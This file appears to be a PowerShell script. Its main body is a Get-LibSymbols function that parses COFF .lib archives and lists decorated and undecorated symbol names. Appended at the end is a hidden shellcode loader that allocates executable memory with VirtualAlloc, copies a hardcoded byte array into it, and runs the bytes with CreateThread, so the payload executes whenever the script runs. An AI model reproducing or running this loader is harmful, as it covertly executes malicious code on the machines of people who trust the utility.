function Get-LibSymbols
{

    [CmdletBinding()] Param (
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipelineByPropertyName = $True)]
        [ValidateScript({ Test-Path $_ })]
        [Alias('FullName')]
        [String[]]
        $Path
    )

    BEGIN
    {
        $Code = @'
        using System;
        using System.IO;
        using System.Text;
        using System.Runtime.InteropServices;

        namespace COFF2
        {
            public class HEADER
	        {
		        public ushort Machine;
		        public ushort NumberOfSections;
		        public DateTime TimeDateStamp;
		        public uint PointerToSymbolTable;
		        public uint NumberOfSymbols;
		        public ushort SizeOfOptionalHeader;
		        public ushort Characteristics;

                public HEADER(BinaryReader br)
                {
                    this.Machine = br.ReadUInt16();
                    this.NumberOfSections = br.ReadUInt16();
                    this.TimeDateStamp = (new DateTime(1970, 1, 1, 0, 0, 0)).AddSeconds(br.ReadUInt32());
                    this.PointerToSymbolTable = br.ReadUInt32();
                    this.NumberOfSymbols = br.ReadUInt32();
                    this.SizeOfOptionalHeader = br.ReadUInt16();
                    this.Characteristics = br.ReadUInt16();
                }
	        }

            public class IMAGE_ARCHIVE_MEMBER_HEADER
            {
                public string Name;
                public DateTime Date;
                public ulong Size;
                public string EndHeader;

                public IMAGE_ARCHIVE_MEMBER_HEADER(BinaryReader br)
                {
                    string tempName = Encoding.UTF8.GetString(br.ReadBytes(16));
                    DateTime dt = new DateTime(1970, 1, 1, 0, 0, 0);
                    this.Name = tempName.Substring(0, tempName.IndexOf((Char) 47));
                    this.Date = dt.AddSeconds(Convert.ToDouble(Encoding.UTF8.GetString(br.ReadBytes(12)).Split((Char) 20)[0]));
                    br.ReadBytes(20); // Skip over UserID, GroupID, and Mode. They are useless fields.
                    this.Size = Convert.ToUInt64(Encoding.UTF8.GetString(br.ReadBytes(10)).Split((Char) 20)[0]);
                    this.EndHeader = Encoding.UTF8.GetString(br.ReadBytes(2));
                }
            }

            public class Functions
            {
                [DllImport("dbghelp.dll", SetLastError=true, PreserveSig=true)]
                public static extern int UnDecorateSymbolName(
                    [In] [MarshalAs(UnmanagedType.LPStr)] string DecoratedName,
                    [Out] StringBuilder UnDecoratedName,
                    [In] [MarshalAs(UnmanagedType.U4)] uint UndecoratedLength,
                    [In] [MarshalAs(UnmanagedType.U4)] uint Flags);
            }
        }
'@

        Add-Type -TypeDefinition $Code

        function Dispose-Objects
        {
            $BinaryReader.Close()
            $FileStream.Dispose()
        }
    }

    PROCESS
    {
        foreach ($File in $Path)
        {
            
            $LibFilePath = Resolve-Path $File

            
            $LibFileName = Split-Path $LibFilePath -Leaf

            $IMAGE_SIZEOF_ARCHIVE_MEMBER_HDR = 60
            $IMAGE_ARCHIVE_START = "!<arch>`n" 
            $IMAGE_SIZEOF_LIB_HDR = $IMAGE_SIZEOF_ARCHIVE_MEMBER_HDR + $IMAGE_ARCHIVE_START.Length
            $IMAGE_ARCHIVE_END = "```n" 
            $SizeofCOFFFileHeader = 20

            
            $FileStream = [IO.File]::OpenRead($LibFilePath)

            $FileLength = $FileStream.Length

            
            if ($FileLength -lt $IMAGE_SIZEOF_LIB_HDR)
            {
                
                Write-Error "$($LibFileName) is too small to store a lib header."
                $FileStream.Dispose()
                return
            }

            
            $BinaryReader = New-Object IO.BinaryReader($FileStream)

            $ArchiveStart = [Text.Encoding]::UTF8.GetString($BinaryReader.ReadBytes(8))

            if ($ArchiveStart -ne $IMAGE_ARCHIVE_START)
            {
                Write-Error "$($LibFileName) does not contain a valid lib header."
                Dispose-Objects
                return
            }

            
            $ArchiveHeader = New-Object COFF2.IMAGE_ARCHIVE_MEMBER_HEADER($BinaryReader)

            if ($ArchiveHeader.EndHeader -ne $IMAGE_ARCHIVE_END)
            {
                Write-Error "$($LibFileName) does not contain a valid lib header."
                Dispose-Objects
                return
            }

            
            if ($ArchiveHeader.Size -eq 0)
            {
                Write-Warning "$($LibFileName) contains no symbols."
                Dispose-Objects
                return
            }

            $NumberOfSymbols = $BinaryReader.ReadBytes(4)

            
            if ([BitConverter]::IsLittleEndian)
            {
                [Array]::Reverse($NumberOfSymbols)
            }

            $NumberOfSymbols = [BitConverter]::ToUInt32($NumberOfSymbols, 0)

            $SymbolOffsets = New-Object UInt32[]($NumberOfSymbols)

            foreach ($Offset in 0..($SymbolOffsets.Length - 1))
            {
                $SymbolOffset = $BinaryReader.ReadBytes(4)

                if ([BitConverter]::IsLittleEndian)
                {
                    [Array]::Reverse($SymbolOffset)
                }

                $SymbolOffsets[$Offset] = [BitConverter]::ToUInt32($SymbolOffset, 0)
            }

            $SymbolStringLength = $ArchiveHeader.Size + $IMAGE_SIZEOF_LIB_HDR - $FileStream.Position - 1
            

            

            
            $SymbolOffsetsSorted = $SymbolOffsets | Sort-Object -Unique

            $SymbolOffsetsSorted | ForEach-Object {
                
                $FileStream.Seek($_, 'Begin') | Out-Null

                $ArchiveHeader = New-Object COFF2.IMAGE_ARCHIVE_MEMBER_HEADER($BinaryReader)

                
                
                
                $CoffHeader = New-Object COFF2.HEADER($BinaryReader)

                
                if ($CoffHeader.NumberOfSections -eq [UInt16]::MaxValue)
                {
                    
                    $SymbolStringLength = $CoffHeader.NumberOfSymbols
                    $Symbols = [Text.Encoding]::UTF8.GetString($BinaryReader.ReadBytes($SymbolStringLength)).Split([Char] 0)

                    $DecoratedSymbol = $Symbols[0]
                    $UndecoratedSymbol = ''

                    
                    $SymbolType = 'C'

                    
                    if ($DecoratedSymbol.StartsWith('?'))
                    {
                        $StrBuilder = New-Object Text.Stringbuilder(512)
                        
                        [COFF.Functions]::UnDecorateSymbolName($DecoratedSymbol, $StrBuilder, $StrBuilder.Capacity, 0) | Out-Null
                        $UndecoratedSymbol = $StrBuilder.ToString()
                        $SymbolType = 'C++'
                    }
                    else
                    {
                        if ($DecoratedSymbol[0] -eq '_' -or $DecoratedSymbol[0] -eq '@')
                        {
                            $UndecoratedSymbol = $DecoratedSymbol.Substring(1).Split('@')[0]
                        }
                        else
                        {
                            $UndecoratedSymbol = $DecoratedSymbol.Split('@')[0]
                        }
                    }

                    $SymInfo = @{
                        DecoratedName = $DecoratedSymbol
                        UndecoratedName = $UndecoratedSymbol
                        Module = $Symbols[1]
                        SymbolType = $SymbolType
                    }

                    $ParsedSymbol = New-Object PSObject -Property $SymInfo
                    $ParsedSymbol.PSObject.TypeNames[0] = 'COFF.SymbolInfo'

                    Write-Output $ParsedSymbol
                }
            }

            
            Dispose-Objects
        }
    }

    END {}
}

$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xba,0x92,0xd2,0xf1,0x47,0xda,0xd0,0xd9,0x74,0x24,0xf4,0x5b,0x29,0xc9,0xb1,0x56,0x31,0x53,0x15,0x83,0xc3,0x04,0x03,0x53,0x11,0xe2,0x67,0x2e,0x19,0xc5,0x87,0xcf,0xda,0xaa,0x0e,0x2a,0xeb,0xea,0x74,0x3e,0x5c,0xdb,0xff,0x12,0x51,0x90,0xad,0x86,0xe2,0xd4,0x79,0xa8,0x43,0x52,0x5f,0x87,0x54,0xcf,0xa3,0x86,0xd6,0x12,0xf7,0x68,0xe6,0xdc,0x0a,0x68,0x2f,0x00,0xe6,0x38,0xf8,0x4e,0x54,0xad,0x8d,0x1b,0x64,0x46,0xdd,0x8a,0xec,0xbb,0x96,0xad,0xdd,0x6d,0xac,0xf7,0xfd,0x8c,0x61,0x8c,0xb4,0x96,0x66,0xa9,0x0f,0x2c,0x5c,0x45,0x8e,0xe4,0xac,0xa6,0x3c,0xc9,0x00,0x55,0x3d,0x0d,0xa6,0x86,0x48,0x67,0xd4,0x3b,0x4a,0xbc,0xa6,0xe7,0xdf,0x27,0x00,0x63,0x47,0x8c,0xb0,0xa0,0x11,0x47,0xbe,0x0d,0x56,0x0f,0xa3,0x90,0xbb,0x3b,0xdf,0x19,0x3a,0xec,0x69,0x59,0x18,0x28,0x31,0x39,0x01,0x69,0x9f,0xec,0x3e,0x69,0x40,0x50,0x9a,0xe1,0x6d,0x85,0x97,0xab,0xf9,0x37,0xc2,0x27,0xfa,0xaf,0x7b,0xa1,0x94,0x46,0xd7,0x59,0x25,0xee,0xf1,0x9e,0x4a,0xc5,0xcc,0x7b,0xe7,0xb5,0x7d,0x2f,0x5b,0x52,0xbb,0x99,0x22,0x05,0x44,0xf0,0x86,0x1a,0xd0,0xf8,0x7b,0xce,0x4c,0x44,0x7a,0xf0,0x8c,0x52,0xf1,0xf0,0x8c,0xa2,0x25,0xb5,0xff,0x9b,0x01,0x01,0xff,0x8b,0x19,0x3e,0x76,0xb4,0x1c,0x3f,0x5d,0x42,0x66,0x93,0x35,0x55,0x55,0xf4,0x41,0x06,0xca,0xa7,0x1e,0xfa,0xba,0x2f,0x4b,0xa9,0x6c,0x8b,0x74,0x87,0xe7,0x81,0x80,0x77,0x60,0xd6,0xa7,0x87,0x70,0x5f,0x27,0xed,0x74,0x0f,0xcd,0xed,0x22,0xc7,0x64,0x54,0x55,0x91,0x79,0x8d,0x3a,0xcd,0xd6,0x7d,0xeb,0x99,0xf5,0x87,0x0b,0x21,0xfa,0x5d,0xae,0x15,0x71,0x54,0xfe,0xe0,0xa0,0x00,0xf0,0xbe,0xf0,0x87,0x0f,0x15,0x9e,0x67,0x98,0x96,0x4e,0x68,0x58,0xff,0x6e,0x68,0x18,0xff,0x3d,0x00,0xc0,0x5b,0x92,0x35,0x0f,0x76,0x87,0xe5,0xa3,0xf0,0x40,0x5e,0x2c,0x03,0xae,0x61,0xac,0x50,0xf8,0x09,0xbe,0xc0,0x8d,0x28,0x41,0x39,0x08,0x6c,0xca,0x0f,0x99,0x6a,0x32,0x53,0x18,0xb4,0x41,0xb6,0x7a,0xf6,0xf5,0xd0,0x0f,0x07,0xf6,0xde,0xd7,0xc5,0x27,0x10,0x1e,0x1c,0x16,0x62,0x4e,0x59,0x54,0x82;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

